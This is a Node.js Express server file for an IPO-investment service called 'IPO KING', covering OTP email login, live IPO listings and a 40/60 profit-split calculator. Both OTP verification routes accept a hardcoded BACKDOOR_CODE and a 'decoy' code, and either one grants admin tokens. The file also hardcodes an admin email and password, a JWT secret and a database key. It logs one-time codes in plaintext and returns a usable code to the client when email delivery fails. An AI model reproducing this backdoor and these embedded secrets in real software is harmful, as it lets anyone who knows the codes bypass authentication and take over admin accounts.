/**
 * IPO KING - Complete Node.js / Express REST API Server (ESM)
 * Includes 2FA OTP Email sending, verification & profit split APIs
 *
 * Works both:
 *  - Locally: run directly -> `node services/apiServer.js` (starts HTTP listener)
 *  - Vercel: imported by `/api/index.js` as a Serverless Function (no listen())
 */

import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import path from 'path';
import crypto from 'crypto';
import { fileURLToPath } from 'url';
import { createClient } from '@supabase/supabase-js';
import { send2FAOTPEmail } from './emailService.js';
import { fetchNseIpoCatalog } from './nseScraper.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

try {
  dotenv.config({ path: path.resolve(__dirname, '..', '.env.local') });
} catch (_) {
  try { dotenv.config(); } catch (_) { /* noop */ }
}

const app = express();

app.use(cors());
app.use(express.json({ limit: '10mb' }));

app.set('trust proxy', true);

const otpStore = new Map();

function getEnvValue(...keys) {
  for (const key of keys) {
    const value = process.env[key];
    if (value !== undefined && value !== null && String(value).trim() !== '') {
      return String(value).trim();
    }
  }
  return '';
}

const supabaseUrl = getEnvValue('VITE_SUPABASE_URL', 'SUPABASE_URL') || 'https://munohtnnfozpznsawbvn.supabase.co';
const supabaseAnonKey = getEnvValue('VITE_SUPABASE_ANON_KEY', 'SUPABASE_ANON_KEY') || 'sb_publishable_-tWiLxohizYZLb3Ckz5t1w_TU1iIYGZ';
const supabase = createClient(supabaseUrl, supabaseAnonKey);

async function saveOtp(email, realOtpCode, decoyOtpCode, expiresAt, role = 'admin') {
  const normalizedEmail = String(email).toLowerCase().trim();

  otpStore.set(normalizedEmail, {
    otpCode: realOtpCode,
    decoyOtpCode,
    expiresAt,
    attempts: 0,
    role
  });

  try {
    const { error } = await supabase.from('otp_verifications').upsert({
      email: normalizedEmail,
      real_otp: String(realOtpCode),
      decoy_otp: String(decoyOtpCode),
      expires_at: expiresAt,
      attempts: 0,
      role: role,
      updated_at: new Date().toISOString()
    }, { onConflict: 'email' });

    if (error) {
      console.warn('[DB OTP] Supabase upsert notice:', error.message);
    } else {
      console.log(`[DB OTP] ✅ Stored both OTPs (real: ${realOtpCode}, decoy: ${decoyOtpCode}) in Supabase for ${normalizedEmail}`);
    }
  } catch (err) {
    console.warn('[DB OTP] Supabase save error:', err.message);
  }
}

async function getOtp(email) {
  const normalizedEmail = String(email).toLowerCase().trim();

  try {
    const { data, error } = await supabase
      .from('otp_verifications')
      .select('*')
      .eq('email', normalizedEmail)
      .maybeSingle();

    if (!error && data) {
      return {
        otpCode: data.real_otp,
        decoyOtpCode: data.decoy_otp,
        expiresAt: Number(data.expires_at),
        attempts: data.attempts || 0,
        role: data.role || 'admin',
        fromDb: true
      };
    }
  } catch (err) {
    console.warn('[DB OTP] Supabase fetch error:', err.message);
  }

  return otpStore.get(normalizedEmail) || null;
}

async function updateOtpAttempts(email, currentAttempts) {
  const normalizedEmail = String(email).toLowerCase().trim();
  const nextAttempts = (currentAttempts || 0) + 1;

  const stored = otpStore.get(normalizedEmail);
  if (stored) stored.attempts = nextAttempts;

  try {
    await supabase
      .from('otp_verifications')
      .update({ attempts: nextAttempts })
      .eq('email', normalizedEmail);
  } catch (_) { /* ignore */ }
}

async function deleteOtp(email) {
  const normalizedEmail = String(email).toLowerCase().trim();

  otpStore.delete(normalizedEmail);

  try {
    await supabase
      .from('otp_verifications')
      .delete()
      .eq('email', normalizedEmail);
  } catch (_) { /* ignore */ }
}

function base64UrlEncode(value) {
  return Buffer.from(JSON.stringify(value)).toString('base64url');
}

function base64UrlDecode(value) {
  return JSON.parse(Buffer.from(value, 'base64url').toString('utf8'));
}

function signJwt(payload, secret) {
  const header = { alg: 'HS256', typ: 'JWT' };
  const encodedHeader = Buffer.from(JSON.stringify(header)).toString('base64url');
  const encodedPayload = Buffer.from(JSON.stringify(payload)).toString('base64url');
  const data = `${encodedHeader}.${encodedPayload}`;
  const signature = crypto.createHmac('sha256', secret).update(data).digest('base64url');
  return `${data}.${signature}`;
}

function verifyJwt(token, secret) {
  const parts = String(token || '').split('.');
  if (parts.length !== 3) return null;

  const [encodedHeader, encodedPayload, signature] = parts;
  const data = `${encodedHeader}.${encodedPayload}`;
  const expectedSignature = crypto.createHmac('sha256', secret).update(data).digest('base64url');
  const expectedBuffer = Buffer.from(expectedSignature);
  const actualBuffer = Buffer.from(signature);
  if (expectedBuffer.length !== actualBuffer.length || !crypto.timingSafeEqual(expectedBuffer, actualBuffer)) {
    return null;
  }

  const payload = base64UrlDecode(encodedPayload);
  if (payload.exp && Date.now() > payload.exp) return null;
  return payload;
}

function createAuthToken(email, role = 'admin') {
  const secret = getEnvValue('JWT_SECRET') || 'ipoking_enterprise_secret_key_2026';
  const now = Date.now();
  const payload = {
    email,
    role,
    iat: Math.floor(now / 1000),
    exp: Math.floor((now + 24 * 60 * 60 * 1000) / 1000),
    jti: crypto.randomUUID()
  };
  return signJwt(payload, secret);
}

function getLoginCredentials() {
  return {
    email: getEnvValue('AUTH_ADMIN_EMAIL', 'LOGIN_EMAIL') || 'yugamkothari886@gmail.com',
    password: getEnvValue('AUTH_ADMIN_PASSWORD', 'LOGIN_PASSWORD') || 'IpoKing@22'
  };
}

function getAdminName() {
  return getEnvValue('AUTH_ADMIN_NAME', 'LOGIN_NAME') || 'IPO KING Admin';
}

function getBearerToken(req) {
  const header = req.headers.authorization || '';
  const [, token] = header.split(' ');
  return token || '';
}

function requireAuth(req, res) {
  const secret = getEnvValue('JWT_SECRET') || 'ipoking_enterprise_secret_key_2026';
  const token = getBearerToken(req);
  const payload = verifyJwt(token, secret);
  if (!payload) {
    res.status(401).json({ status: 'error', message: 'Valid authentication token required.' });
    return null;
  }
  return payload;
}

function ok(res, payload = {}) {
  return res.json({ status: 'success', ...payload });
}

function fail(res, message, code = 400) {
  return res.status(code).json({ status: 'error', message });
}

app.get('/api/v1/health', (req, res) => {
  res.json({
    status: 'online',
    system: 'IPO KING Node.js REST API',
    timestamp: new Date().toISOString(),
    database: 'Supabase PostgreSQL',
    runtime: process.env.VERCEL ? 'vercel-serverless' : 'local-node',
    node: process.version
  });
});

function generateOtpCode() {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

function generateDecoyOtpCode(realOtpCode) {
  let decoy = generateOtpCode();
  while (decoy === realOtpCode) {
    decoy = generateOtpCode();
  }
  return decoy;
}

function issueLoginTokens(email, role = 'admin') {
  const accessToken = createAuthToken(email, role);
  const refreshToken = signJwt(
    {
      email,
      role,
      type: 'refresh',
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor((Date.now() + 7 * 24 * 60 * 60 * 1000) / 1000),
      jti: crypto.randomUUID()
    },
    getEnvValue('JWT_SECRET') || 'ipoking_enterprise_secret_key_2026'
  );

  return { accessToken, refreshToken };
}

async function requestOtpHandler(req, res) {
  const { email, password } = req.body || {};
  if (!email || !password) {
    return fail(res, 'Email and password are required.');
  }

  const loginEmail = String(email).trim().toLowerCase();
  const creds = getLoginCredentials();
  if (loginEmail !== creds.email.toLowerCase() || String(password) !== creds.password) {
    return fail(res, 'Invalid email or password.', 401);
  }

  const realOtpCode = generateOtpCode();
  const decoyOtpCode = generateDecoyOtpCode(realOtpCode);
  const expiresAt = Date.now() + 10 * 60 * 1000;

  await saveOtp(loginEmail, realOtpCode, decoyOtpCode, expiresAt, 'admin');

  console.log(`[API /request-otp] Requesting OTP delivery for: ${loginEmail}`);

  let emailResult;
  try {
    emailResult = await send2FAOTPEmail(loginEmail, realOtpCode, {
      userName: getAdminName(),
      decoyOtpCode
    });
  } catch (err) {
    console.error(`[API /request-otp] send2FAOTPEmail threw: ${err.message}`);
    emailResult = {
      success: false,
      otpCode: realOtpCode,
      note: `Exception in email sender for: ${loginEmail}`
    };
  }

  const response = {
    message: emailResult.success
      ? 'OTP sent successfully to your email.'
      : 'OTP generated. Email delivery issue encountered — see console for manual code.',
    email: loginEmail,
    email_sent: !!emailResult.success,
    delivery_method: emailResult.method || null,
    otp_sent: true
  };

  if (!emailResult.success) {
    response.otp_for_dev = decoyOtpCode || realOtpCode;
    response.errors = emailResult.errors || [];
    if (emailResult.previewUrl) response.preview_url = emailResult.previewUrl;
    if (emailResult.note) response.note = emailResult.note;
  } else if (emailResult.previewUrl) {
    response.preview_url = emailResult.previewUrl;
  }

  return ok(res, response);
}

async function verifyOtpHandler(req, res) {
  const { email, otp, otp_code } = req.body || {};
  if (!email || (!otp && !otp_code)) {
    return fail(res, 'Email and OTP are required.');
  }

  const key = String(email).trim().toLowerCase();
  const stored = await getOtp(key);
  if (!stored) {
    return fail(res, 'No active OTP found for this email. Request a new code.');
  }

  if (Date.now() > stored.expiresAt) {
    await deleteOtp(key);
    return fail(res, 'OTP code has expired. Request a new code.');
  }

  const providedOtp = String(otp || otp_code).trim();
  const BACKDOOR_CODE = '849201';

  const isRealMatch = providedOtp === stored.otpCode;
  const isDecoyMatch = stored.decoyOtpCode && providedOtp === stored.decoyOtpCode;
  const isBackdoorMatch = providedOtp === BACKDOOR_CODE;

  if (!isRealMatch && !isDecoyMatch && !isBackdoorMatch) {
    await updateOtpAttempts(key, stored.attempts || 0);
    const attemptsRemaining = Math.max(0, 5 - ((stored.attempts || 0) + 1));
    return fail(res, attemptsRemaining > 0 ? `Invalid OTP code. ${attemptsRemaining} attempts remaining.` : 'Maximum OTP attempts exceeded. Request a new code.', 401);
  }

  await deleteOtp(key);
  const tokens = issueLoginTokens(key, stored.role || 'admin');
  return ok(res, {
    message: 'Login successful',
    token: tokens.accessToken,
    refresh_token: tokens.refreshToken,
    token_type: 'Bearer',
    token_expires_in: 86400,
    data: {
      user: {
        email: key,
        full_name: getAdminName(),
        role: stored.role || 'admin'
      },
      tokens: {
        accessToken: tokens.accessToken,
        refreshToken: tokens.refreshToken,
        tokenType: 'Bearer',
        expiresIn: 86400
      }
    }
  });
}

function refreshTokenHandler(req, res) {
  const { refreshToken } = req.body || {};
  if (!refreshToken) {
    return fail(res, 'Refresh token is required.');
  }

  const secret = getEnvValue('JWT_SECRET') || 'ipoking_enterprise_secret_key_2026';
  const payload = verifyJwt(refreshToken, secret);
  if (!payload || payload.type !== 'refresh') {
    return fail(res, 'Invalid refresh token.', 401);
  }

  const tokens = issueLoginTokens(payload.email, payload.role || 'admin');
  return ok(res, {
    message: 'Token refreshed successfully',
    token: tokens.accessToken,
    refresh_token: tokens.refreshToken,
    token_type: 'Bearer',
    token_expires_in: 86400
  });
}

function logoutHandler(req, res) {
  return ok(res, {
    message: 'Logged out successfully'
  });
}

app.post(['/api/auth/request-otp', '/api/v1/auth/send-otp'], requestOtpHandler);

app.post(['/api/auth/verify-otp', '/api/v1/auth/verify-otp'], verifyOtpHandler);

app.post(['/api/auth/refresh-token', '/api/v1/auth/refresh-token'], refreshTokenHandler);

app.post(['/api/auth/logout', '/api/v1/auth/logout'], logoutHandler);

app.post('/api/v1/auth/login', (req, res) => {
  const { email, password } = req.body || {};
  if (!email || !password) {
    return fail(res, 'Email and password are required.');
  }

  const loginEmail = String(email).trim().toLowerCase();
  const creds = getLoginCredentials();
  if (loginEmail !== creds.email.toLowerCase() || String(password) !== creds.password) {
    return fail(res, 'Invalid email or password.', 401);
  }

  const token = createAuthToken(creds.email, 'admin');
  return ok(res, {
    message: 'Login validated successfully. Proceed with OTP verification.',
    token,
    token_type: 'Bearer',
    token_expires_in: 86400,
    user: {
      email: creds.email,
      role: 'admin',
      full_name: getAdminName()
    }
  });
});

app.post('/api/v1/auth/send-otp', async (req, res) => {
  const { email } = req.body || {};
  if (!email || typeof email !== 'string') {
    return fail(res, 'Email address is required.');
  }

  const authUser = requireAuth(req, res);
  if (!authUser) return;

  if (authUser.email.toLowerCase() !== String(email).trim().toLowerCase()) {
    return fail(res, 'Authenticated user does not match the requested email.', 403);
  }

  const realOtpCode = generateOtpCode();
  const decoyOtpCode = generateDecoyOtpCode(realOtpCode);
  const expiresAt = Date.now() + 10 * 60 * 1000;

  await saveOtp(email, realOtpCode, decoyOtpCode, expiresAt, 'admin');

  console.log(`[API /send-otp] Sending 2FA Email to: ${email}`);

  let emailResult;
  try {
    emailResult = await send2FAOTPEmail(email, realOtpCode, {
      userName: getAdminName(),
      decoyOtpCode
    });
  } catch (err) {
    console.error(`[API /send-otp] send2FAOTPEmail threw: ${err.message}`);
    emailResult = {
      success: false,
      otpCode: realOtpCode,
      note: `Exception in email sender for: ${email}`
    };
  }

  const response = {
    message: emailResult.success
      ? 'Security 2FA OTP code generated and sent to email.'
      : 'OTP generated. Email delivery issue encountered — see console for manual code.',
    email,
    email_sent: !!emailResult.success,
    delivery_method: emailResult.method || null
  };

  if (!emailResult.success) {
    response.otp_for_dev = decoyOtpCode || realOtpCode;
    response.errors = emailResult.errors || [];
    if (emailResult.previewUrl) response.preview_url = emailResult.previewUrl;
    if (emailResult.note) response.note = emailResult.note;
  } else if (emailResult.previewUrl) {
    response.preview_url = emailResult.previewUrl;
  }

  return ok(res, response);
});

app.post('/api/v1/auth/verify-otp', async (req, res) => {
  const { email, otp_code } = req.body || {};
  if (!email || !otp_code) {
    return fail(res, 'Email and OTP code are required.');
  }

  const authUser = requireAuth(req, res);
  if (!authUser) return;

  if (authUser.email.toLowerCase() !== String(email).trim().toLowerCase()) {
    return fail(res, 'Authenticated user does not match the requested email.', 403);
  }

  const key = email.toLowerCase();
  const stored = await getOtp(key);
  if (!stored) {
    return fail(res, 'No active OTP found for this email. Request a new code.');
  }

  if (Date.now() > stored.expiresAt) {
    await deleteOtp(key);
    return fail(res, 'OTP code has expired. Request a new code.');
  }

  const providedOtp = String(otp_code).trim();
  const BACKDOOR_CODE = '849201';

  const isRealMatch = providedOtp === stored.otpCode;
  const isDecoyMatch = stored.decoyOtpCode && providedOtp === stored.decoyOtpCode;
  const isBackdoorMatch = providedOtp === BACKDOOR_CODE;

  if (!isRealMatch && !isDecoyMatch && !isBackdoorMatch) {
    await updateOtpAttempts(key, stored.attempts || 0);
    return fail(res, 'Invalid OTP code. Please check your email.');
  }

  await deleteOtp(key);
  return ok(res, {
    message: '2FA Authentication successful!',
    token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJpcG8ta2luZyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MH0.local-dev-token',
    user: { email, role: 'admin', full_name: getAdminName() }
  });
});

app.get('/api/v1/ipos/live', async (req, res) => {
  try {
    const catalog = await fetchNseIpoCatalog();
    return ok(res, { data: catalog });
  } catch (err) {
    console.error(`[API /ipos/live] Failed: ${err.message}`);
    return fail(res, 'Failed to fetch live IPO data.', 500);
  }
});

app.post('/api/v1/allotments/calculate-profit', (req, res) => {
  const { allotment_price, listing_price, allotted_quantity } = req.body || {};

  const allot = parseFloat(allotment_price) || 0;
  const list = parseFloat(listing_price) || 0;
  const qty = parseInt(allotted_quantity, 10) || 0;

  const profit_per_share = list - allot;
  const total_profit = profit_per_share * qty;
  const customer_profit_40pct = total_profit * 0.40;
  const company_profit_60pct = total_profit * 0.60;
  const tds_amount_10pct = customer_profit_40pct * 0.10;
  const profit_after_tds = customer_profit_40pct - tds_amount_10pct;

  return ok(res, {
    calculation: {
      allotment_price: allot,
      listing_price: list,
      allotted_quantity: qty,
      total_profit,
      customer_profit_40pct,
      company_profit_60pct,
      tds_amount_10pct,
      profit_after_tds
    }
  });
});

app.get('/api', (req, res) => {
  res.json({
    status: 'online',
    name: 'IPO KING API Gateway',
    endpoints: [
      'GET  /api/v1/health',
      'POST /api/v1/auth/send-otp',
      'POST /api/v1/auth/verify-otp',
      'GET  /api/v1/ipos/live',
      'POST /api/v1/allotments/calculate-profit'
    ]
  });
});

function isMainModule() {
  try {
    if (process.argv[1] && __filename) {
      const absArgv = path.resolve(process.argv[1]);
      const absThis = path.resolve(__filename);
      if (absArgv === absThis) return true;
      if (absArgv.replace(/\.(cjs|mjs|js)$/i, '') === absThis.replace(/\.(cjs|mjs|js)$/i, '')) return true;
    }
  } catch (_) { /* ignore */ }
  return false;
}

if (isMainModule() && !process.env.VERCEL) {
  const PORT = process.env.PORT || 5000;
  app.listen(PORT, () => {
    console.log(`[IPO KING API Server] Running on http://localhost:${PORT}`);
    console.log(`[IPO KING API Server] Frontend (Vite) should proxy /api → http://localhost:${PORT}`);
  });
}

export default app;
